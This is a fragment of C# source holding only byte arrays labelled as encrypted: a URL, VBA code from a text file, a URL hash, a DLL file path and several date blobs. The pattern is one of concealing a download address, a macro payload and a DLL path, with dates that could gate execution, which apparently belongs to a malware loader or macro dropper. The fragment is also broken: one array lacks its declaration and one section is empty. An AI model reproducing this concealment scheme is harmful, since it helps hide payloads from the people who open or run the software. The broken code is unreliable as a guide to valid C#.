// ------ encryptedUrlBlob ------
private static readonly byte[] encryptedUrlBlob =
new byte[] { 198, 39, 212, 158, 138, 92, 127, 71, 132, 196, 117, 20, 84, 76, 248, 81, 213, 228, 53, 61, 97, 115, 145, 184, 235, 106, 158, 244, 123, 88, 239, 45, 236, 191, 109, 114, 122, 215, 91, 168, 31, 189, 54, 219, 57, 240, 171, 69, 162, 228, 131, 140, 54, 252, 211, 31, 14, 202, 93, 9, 104, 108, 191, 17, 72, 234, 69, 9, 51, 61, 161, 12, 31, 173, 68, 134, 65, 0, 216, 145, 27, 36, 149, 247, 26, 36, 31, 38, 49, 68, 129, 222, 207, 206, 162, 195 };

// ------ encryptedVbaCode1 (from myvba1.txt) ------
private static readonly byte[] encryptedVbaCode1 =
new byte[] { 171, 58, 176, 211, 220, 98, 54, 34, 43, 14, 19, 9, 137, 51, 130, 59, 204, 39, 229, 5, 228, 100, 134, 196, 236, 159, 171, 204, 126, 26, 158, 168, 8, 168, 231, 73, 75, 154, 224, 209, 82, 43, 185, 245, 214, 31, 147, 30, 180, 53, 221, 225, 175, 47, 181, 86, 193, 73, 18, 65, 168, 1, 58, 10 };

// ------ encryptedUrlHashBlob ------
private static readonly byte[] encryptedUrlHashBlob =
new byte[] { 198, 39, 212, 158, 138, 92, 127, 71, 132, 196, 117, 20, 84, 76, 248, 81, 213, 228, 53, 61, 97, 115, 145, 184, 235, 106, 158, 244, 123, 88, 239, 45, 236, 191, 109, 114, 122, 215, 91, 168, 31, 189, 54, 219, 57, 240, 171, 69, 162, 228, 131, 140, 54, 252, 211, 31, 14, 202, 93, 9, 104, 108, 191, 17, 252, 80, 195, 155, 183, 163, 241, 158, 198, 102, 116, 83, 75, 221, 90, 69, 139, 167, 119, 121, 59, 133, 227, 61, 168, 159, 113, 232, 211, 53, 37, 217 };

// ------ encryptedDllFilePath ------

new byte[] { 51, 105, 164, 162, 101, 165, 170, 244, 184, 221, 158, 152, 98, 96, 229, 71, 102, 114, 65, 59, 219, 110, 11, 232, 157, 32, 148, 172, 150, 110, 12, 20 };

// ------ encryptedDate1Blob (datePart1) ------
private static readonly byte[] encryptedDate1Blob =
new byte[] { 38, 86, 125, 170, 13, 140, 171, 73, 44, 220, 9, 136, 181, 128, 68, 53, 13, 52, 177, 4, 133, 102, 128, 148, 149, 111, 174, 192, 137, 131, 251, 209 };

// ------ encryptedDate2Blob (datePart2) ------

// ------ encryptedReverseDateBlob ------
private static readonly byte[] encryptedReverseDateBlob =
new byte[] { 161, 138, 46, 115, 123, 39, 73, 4, 243, 254, 204, 97, 59, 189, 60, 126, 158, 146, 190, 111, 175, 43, 179, 209, 241, 178, 102, 69, 231, 130, 45, 55, 180, 199, 247, 60, 101, 239, 205, 238, 40, 41, 107, 23, 232, 91, 58, 138, 7, 144, 194, 128, 30, 19, 15, 223, 203, 163, 73, 74, 102, 198, 223, 99, 86, 219, 10, 184, 228, 41, 204, 165, 38, 62, 75, 205, 13, 170, 141, 39, 233, 188, 162, 117, 69, 12, 233, 12, 34, 150, 117, 165, 110, 18, 50, 202 };
